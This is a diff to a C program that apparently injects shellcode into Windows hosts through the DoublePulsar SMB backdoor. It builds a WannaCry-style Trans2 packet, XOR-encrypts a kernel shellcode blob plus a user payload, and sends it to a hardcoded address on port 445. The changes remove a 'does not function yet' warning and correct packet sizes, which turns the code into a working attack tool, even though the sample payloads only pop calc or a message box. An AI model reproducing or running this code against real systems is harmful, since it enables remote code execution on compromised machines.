@@ -1,7 +1,4 @@
 #define _CRT_SECURE_NO_WARNINGS
-/*
-WARNING: This code compiles but does not function yet
-*/
 
 #include <windows.h>
 #include <stdio.h>
@@ -95,6 +92,53 @@ int xor_payload(unsigned int xor_key, unsigned char* buf, int size)
 	return 0;
 }
 
+void hexDump(char* desc, void* addr, int len)
+{
+	int i;
+	unsigned char buff[17];
+	unsigned char* pc = (unsigned char*)addr;
+
+	// Output description if given.
+	if (desc != NULL)
+		printf("%s:\n", desc);
+
+	// Process every byte in the data.
+	for (i = 0; i < len; i++) {
+		// Multiple of 16 means new line (with line offset).
+
+		if ((i % 16) == 0) {
+			// Just don't print ASCII for the zeroth line.
+			if (i != 0)
+				printf("  %s\n", buff);
+
+			// Output the offset.
+			printf("  %04x ", i);
+		}
+
+		// Now the hex code for the specific character.
+		printf(" %02x", pc[i]);
+
+		// And store a printable ASCII character for later.
+		if ((pc[i] < 0x20) || (pc[i] > 0x7e)) {
+			buff[i % 16] = '.';
+		}
+		else {
+			buff[i % 16] = pc[i];
+		}
+
+		buff[(i % 16) + 1] = '\0';
+	}
+
+	// Pad out last line if not exactly 16 characters.
+	while ((i % 16) != 0) {
+		printf("   ");
+		i++;
+	}
+
+	// And print the final ASCII bit.
+	printf("  %s\n", buff);
+}
+
 unsigned char recvbuff[2048];
 int main(int argc, char* argv[])
 {
@@ -111,9 +155,9 @@ int main(int argc, char* argv[])
 		return 0;
 	}
 	server.sin_family = AF_INET;
-	server.sin_addr.s_addr = inet_addr(argv[1]);
+	server.sin_addr.s_addr = inet_addr("192.168.0.9");
 	server.sin_port = htons((USHORT)445);
-	printf("Connecting to %s\n", argv[1]);
+	printf("Connecting to %s\n", "192.168.0.9");
 	ret = connect(sock, (struct sockaddr*)&server, sizeof(server));
 
 	//send SMB negociate packet
@@ -137,7 +181,7 @@ int main(int argc, char* argv[])
 	ptr = packet;
 	memcpy(ptr, SMB_TreeConnectAndX, sizeof(SMB_TreeConnectAndX) - 1);
 	ptr += sizeof(SMB_TreeConnectAndX) - 1;
-	sprintf((char*)tmp, "\\\\%s\\IPC$", argv[1]);
+	sprintf((char*)tmp, "\\\\%s\\IPC$", "192.168.0.9");
 	convert_name((char*)ptr, (char*)tmp);
 	smblen = strlen((char*)tmp) * 2;
 	ptr += smblen;
@@ -263,25 +307,40 @@ int main(int argc, char* argv[])
 		"\xBB\x46\x45\x1B\x22\xE8\x68\xFF\xFF\xFF\x48\x89\xEC\x5D\x41\x5F"
 		"\x5E\xC3";
 
-	/*
-	https://www.exploit-db.com/shellcodes/49819
-	
-	Windows/x64 - Dynamic Null-Free WinExec PopCalc Shellcode (205 Bytes)
-	*/
-	unsigned int payload_len = 205;
 	unsigned char shellcode[] =
-		"\x48\x31\xff\x48\xf7\xe7\x65\x48\x8b\x58\x60\x48\x8b\x5b\x18\x48\x8b\x5b\x20\x48\x8b\x1b\x48\x8b\x1b\x48\x8b\x5b\x20\x49\x89\xd8\x8b"
-		"\x5b\x3c\x4c\x01\xc3\x48\x31\xc9\x66\x81\xc1\xff\x88\x48\xc1\xe9\x08\x8b\x14\x0b\x4c\x01\xc2\x4d\x31\xd2\x44\x8b\x52\x1c\x4d\x01\xc2"
-		"\x4d\x31\xdb\x44\x8b\x5a\x20\x4d\x01\xc3\x4d\x31\xe4\x44\x8b\x62\x24\x4d\x01\xc4\xeb\x32\x5b\x59\x48\x31\xc0\x48\x89\xe2\x51\x48\x8b"
-		"\x0c\x24\x48\x31\xff\x41\x8b\x3c\x83\x4c\x01\xc7\x48\x89\xd6\xf3\xa6\x74\x05\x48\xff\xc0\xeb\xe6\x59\x66\x41\x8b\x04\x44\x41\x8b\x04"
-		"\x82\x4c\x01\xc0\x53\xc3\x48\x31\xc9\x80\xc1\x07\x48\xb8\x0f\xa8\x96\x91\xba\x87\x9a\x9c\x48\xf7\xd0\x48\xc1\xe8\x08\x50\x51\xe8\xb0"
-		"\xff\xff\xff\x49\x89\xc6\x48\x31\xc9\x48\xf7\xe1\x50\x48\xb8\x9c\x9e\x93\x9c\xd1\x9a\x87\x9a\x48\xf7\xd0\x50\x48\x89\xe1\x48\xff\xc2"
-		"\x48\x83\xec\x20\x41\xff\xd6";
+		"\x31\xdb\xb3\x30\x29\xdc\x64\x8b\x03\x8b\x40\x0c\x8b"
+		"\x58\x1c\x8b\x1b\x8b\x1b\x8b\x73\x08\x89\xf7\x89\x3c"
+		"\x24\x8b\x47\x3c\x01\xc7\x31\xdb\xb3\x78\x01\xdf\x8b"
+		"\x3f\x8b\x04\x24\x01\xf8\x89\x44\x24\x08\x31\xdb\xb3"
+		"\x1c\x01\xc3\x8b\x03\x8b\x3c\x24\x01\xf8\x89\x44\x24"
+		"\x0c\x8b\x44\x24\x08\x31\xdb\xb3\x20\x01\xc3\x8b\x03"
+		"\x01\xf8\x89\x44\x24\x10\x8b\x44\x24\x08\x31\xdb\xb3"
+		"\x24\x01\xc3\x8b\x03\x01\xf8\x89\x44\x24\x14\x8b\x44"
+		"\x24\x08\x31\xdb\xb3\x18\x01\xc3\x8b\x03\x89\x44\x24"
+		"\x18\x8b\x74\x24\x30\x31\xf6\x89\x74\x24\x30\x8b\x4c"
+		"\x24\x18\x8b\x2c\x24\x8b\x5c\x24\x10\x8b\x4c\x24\x18"
+		"\x85\xc9\x74\x5f\x49\x89\x4c\x24\x18\x8b\x34\x8b\x01"
+		"\xee\x31\xff\x31\xc0\xfc\xac\x84\xc0\x74\x07\xc1\xcf"
+		"\x0d\x01\xc7\xeb\xf4\x8b\x5c\x24\x14\x66\x8b\x0c\x4b"
+		"\x8b\x5c\x24\x0c\x8b\x04\x8b\x01\xe8\x8b\x34\x24\x81"
+		"\xff\xaa\xfc\x0d\x7c\x75\x08\x8d\x74\x24\x20\x89\x06"
+		"\xeb\xb5\x81\xff\x8e\x4e\x0e\xec\x75\x08\x8d\x74\x24"
+		"\x24\x89\x06\xeb\xa5\x81\xff\x7e\xd8\xe2\x73\x75\x9d"
+		"\x8d\x74\x24\x1c\x89\x06\xeb\x95\x89\xe6\x31\xd2\x66"
+		"\xba\x6c\x6c\x52\x68\x33\x32\x2e\x64\x68\x75\x73\x65"
+		"\x72\x54\xff\x56\x24\x89\x46\x28\x31\xd2\xb2\x41\x52"
+		"\x31\xd2\x66\xba\x6f\x78\x66\x52\x68\x61\x67\x65\x42"
+		"\x68\x4d\x65\x73\x73\x54\x50\xff\x56\x20\x89\x46\x2c"
+		"\x31\xd2\xb2\x20\x52\x31\xd2\x66\xba\x74\x6f\x66\x52"
+		"\x68\x69\x79\x61\x6e\x68\x46\x65\x62\x72\x89\xe3\x31"
+		"\xd2\xb2\x6f\x52\x68\x48\x65\x6c\x6c\x89\xe1\x31\xd2"
+		"\xb2\x04\x52\x31\xd2\x51\x53\x31\xff\x57\xff\x56\x2c"
+		"\x89\xf4\x57\xff\x54\x24\x20";
 
 	//might need to make this static due to sizeof being garbage @ counting shellcode
 	unsigned int kernel_shellcode_size = sizeof(kernel_shellcode) / sizeof(kernel_shellcode[0]);
 	unsigned int payload_shellcode_size = sizeof(shellcode) / sizeof(shellcode[0]);
-	
+
 	//remove the NULL terminator count
 	kernel_shellcode_size -= 1;
 	payload_shellcode_size -= 1;
@@ -290,80 +349,129 @@ int main(int argc, char* argv[])
 	unsigned int EntireShellcodeSize = kernel_shellcode_size + payload_shellcode_size + 2;
 
 	//generate the SESSION_SETUP parameters here
-	unsigned int TotalSizeOfPayload = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
-	unsigned int ChunkSize = 4096 ^ XorKey; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
-	unsigned int OffsetofChunkinPayload = 0x0000 ^ XorKey;
-	unsigned char Parametersbuffer[12];
+	unsigned int TotalSizeOfPayload = EntireShellcodeSize; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int ChunkSize = EntireShellcodeSize; //in the future, we may make this value dynamic based on the len of the shellcode if it's less than 4096
+	unsigned int OffsetofChunkinPayload = 0x0000;
+	unsigned char Parametersbuffer[13];
 	memset(Parametersbuffer, 0x00, 12);
 	memcpy((unsigned char*)Parametersbuffer, (unsigned char*)&TotalSizeOfPayload, 4);
 	memcpy((unsigned char*)Parametersbuffer + 4, (unsigned char*)&ChunkSize, 4);
 	memcpy((unsigned char*)Parametersbuffer + 8, (unsigned char*)&OffsetofChunkinPayload, 4);
+	hexDump(NULL, Parametersbuffer, 12);
 
-	//convert the calculated XOR key from unsigned int to unsigned char
-	/*
-	unsigned char char_xor_key[5];
-	char_xor_key[0] = (unsigned char)XorKey;
-	char_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
-	char_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
-	char_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);*/
+	unsigned char byte_xor_key[5];
+	byte_xor_key[0] = (unsigned char)XorKey;
+	byte_xor_key[1] = (unsigned char)(((unsigned int)XorKey >> 8) & 0xFF);
+	byte_xor_key[2] = (unsigned char)(((unsigned int)XorKey >> 16) & 0xFF);
+	byte_xor_key[3] = (unsigned char)(((unsigned int)XorKey >> 24) & 0xFF);
 
-	//Encrypting signature buffer
-	/*
 	int i;
 	for (i = 0; i < 13; i++)
 	{
-		Parametersbuffer[i] ^= char_xor_key[i % 4];
-	} */
+		Parametersbuffer[i] ^= byte_xor_key[i % 4];
+	}
+	hexDump(NULL, Parametersbuffer, 12);
 
 	//allocate memory for encrypted shellcode payload buffer
-	unsigned char* encrypted;
-	encrypted = (unsigned char*)malloc(4096 + 1);
+	unsigned char *encrypted = (unsigned char*)malloc(EntireShellcodeSize);
 
 	//initialize to 0
-	memset((unsigned char*)encrypted, 0x00, 4096);
+	memset((unsigned char*)encrypted, 0x00, EntireShellcodeSize);
 
 	//calculate the payload shellcode length
-	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]); //or statically put your own value here
-	
+	DWORD dwPayloadShellcodeSize = sizeof(shellcode) / sizeof(shellcode[0]);
+
 	//remove the NULL terminator from the shellcode count
-        dwPayloadShellcodeSize -= 1; 
-	
+	dwPayloadShellcodeSize -= 1;
+
 	//copy kernel shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted, (char*)&kernel_shellcode, kernel_shellcode_size);
-	
+
+	hexDump(NULL, encrypted, kernel_shellcode_size);
+
 	//copy the shellcode size after the kernel shellcode
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size, (char*)&dwPayloadShellcodeSize, 2);
+
+	hexDump(NULL, encrypted, kernel_shellcode_size + 2);
 
 	//copy payload shellcode to encrypted buffer
 	memcpy((unsigned char*)encrypted + kernel_shellcode_size + 2, (char*)&shellcode, payload_shellcode_size);
 
-	//FOR DEBUG PURPOSES ONLY, will convert to a function later
-	//Xor the data buffer with the calculated key
-	for (i = 0; i < 4096; i++)
+	hexDump(NULL, encrypted, kernel_shellcode_size + 2 + payload_shellcode_size);
+
+	for (i = 0; i < kernel_shellcode_size + 2 + payload_shellcode_size; i++)
 	{
-		encrypted[i] ^= char_xor_key[i % 4];
+		encrypted[i] ^= byte_xor_key[i % 4];
 	}
+	//hexDump(NULL, encrypted, EntireShellcodeSize);
 	//xor_payload(XorKey, (unsigned char*)encrypted, 4096);
 
 	//allocate memory for the big packet
-	unsigned char* big_packet = (unsigned char*)malloc(4178 + 1);
-	memset((unsigned char*)big_packet, 0x00, 4178 + 1);
+	unsigned char* big_packet = (unsigned char*)malloc(EntireShellcodeSize + 12 + 70);
+	memset((unsigned char*)big_packet, 0x00, EntireShellcodeSize + 12 + 70);
 
 	//copy wannacry skeleton packet to big Trans2 packet
-	memcpy((unsigned char*)big_packet, (unsigned char*)&wannacry_Trans2_Request, 70);
+	memcpy((unsigned char*)big_packet, (unsigned char*)wannacry_Trans2_Request, 70);
 
 	//copy parameters to big packet at offset 70 ( after the trans2 exec packet )
-	memcpy((unsigned char*)big_packet + 70, (unsigned char*)&Parametersbuffer, 12);
+	memcpy((unsigned char*)big_packet + 70, (unsigned char*)Parametersbuffer, 12);
 
 	//copy encrypted payload
-	memcpy((unsigned char*)big_packet + 82, (unsigned char*)&encrypted, 4096);
+	memcpy((unsigned char*)big_packet + 82, (unsigned char*)encrypted, EntireShellcodeSize);
 
 	//Update treeID, UserID
 	memcpy((unsigned char*)big_packet + 28, (char*)&treeid, 2);
 	memcpy((unsigned char*)big_packet + 32, (char*)&userid, 2);
-	
-	/* for future use 
-	
+
+	//patch other values
+	unsigned short TotalDataCount = EntireShellcodeSize;
+	unsigned short DataCount = EntireShellcodeSize;
+	unsigned short byteCount = EntireShellcodeSize + 13;
+
+	*(WORD*)(big_packet + 0x27) = TotalDataCount;
+	*(WORD*)(big_packet + 0x3b) = DataCount;
+	*(WORD*)(big_packet + 0x43) = byteCount;
+
+	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
+	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);
+
+
+	//patch SMB length
+	unsigned short smb_length = EntireShellcodeSize + 12 + 70 - 4;
+	printf("NetBIOS value of the SMB Length:  %hu\n", smb_length);
+
+	unsigned short smb_htons_len = htons(EntireShellcodeSize + 12 + 70 - 4);
+	memcpy((unsigned char*)big_packet + 2, (char*)&smb_htons_len, 2);
+
+	int size_big_packet = EntireShellcodeSize + 82;
+	printf("TOTAL Size of packet = %d\nThis value is +4 the NetBIOS value length\n", size_big_packet);
+
+	//hexDump(NULL, big_packet, EntireShellcodeSize + 12 + 70);
+
+	unsigned char *pExeBuffer = (unsigned char*)malloc(size_big_packet);
+	//PBYTE pExeBuffer = new BYTE[size_big_packet];
+	memcpy(pExeBuffer, big_packet, size_big_packet);
+	//pExeBuffer[size_big_packet] = '\0';
+	//hexDump(NULL, pExeBuffer, EntireShellcodeSize + 12 + 70);
+	//delete pExeBuffer;
+
+	//send the payload
+	send(sock, (char*)pExeBuffer, size_big_packet, 0);
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+
+	if(recvbuff[34] = 0x52)
+	{
+		printf("Doublepulsar returned 82!\n");
+	}
+	else {
+		printf("Doublepulsar didn't work!\n");
+	}
+
+	free(pExeBuffer);
+
+	/* for future use
+
 	//update key values in the packet
 	unsigned short smb_length = 4096+70+12;
 	printf("SMB Length:  %hu\n", smb_length);
@@ -381,15 +489,41 @@ int main(int argc, char* argv[])
 	memcpy((unsigned char*)big_packet + 0x27, (char*)&TotalDataCount, 2);
 	memcpy((unsigned char*)big_packet + 0x3b, (char*)&DataCount, 2);
 	memcpy((unsigned char*)big_packet + 0x43, (char*)&byteCount, 2);
-	
-	*/
 
-	//send the payload
-	send(sock, (char*)big_packet, sizeof(big_packet) - 1, 0);
-	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+	*/
 
 	free(encrypted);
 	free(big_packet);
+
+
+	unsigned char disconnect_packet[] = 
+		"\x00\x00\x00\x23\xff\x53\x4d\x42"
+		"\x71\x00\x00\x00\x00\x18\x07\xc0"
+		"\x00\x00\x00\x00\x00\x00\x00\x00"
+		"\x00\x00\x00\x00\x00\x08\xff\xfe"
+		"\x00\x08\x41\x00\x00\x00\x00";
+
+	//Update treeID, UserID
+	memcpy((unsigned char*)disconnect_packet + 28, (char*)&treeid, 2);
+	memcpy((unsigned char*)disconnect_packet + 32, (char*)&userid, 2);
+
+	//send the disconnect packet
+	send(sock, (char*)disconnect_packet, sizeof(disconnect_packet) - 1, 0);
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
+
+
+	unsigned char logoff_packet[] = 
+		"\x00\x00\x00\x27\xff\x53\x4d\x42\x74\x00\x00"
+		"\x00\x00\x18\x07\xc0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\xff"
+		"\xfe\x00\x08\x41\x00\x02\xff\x00\x27\x00\x00\x00";
+
+	//Update treeID, UserID
+	memcpy((unsigned char*)logoff_packet + 28, (char*)&treeid, 2);
+	memcpy((unsigned char*)logoff_packet + 32, (char*)&userid, 2);
+
+	//send the logoff packet
+	send(sock, (char*)logoff_packet, sizeof(logoff_packet) - 1, 0);
+	recv(sock, (char*)recvbuff, sizeof(recvbuff), 0);
 
 	closesocket(sock);
 	WSACleanup();
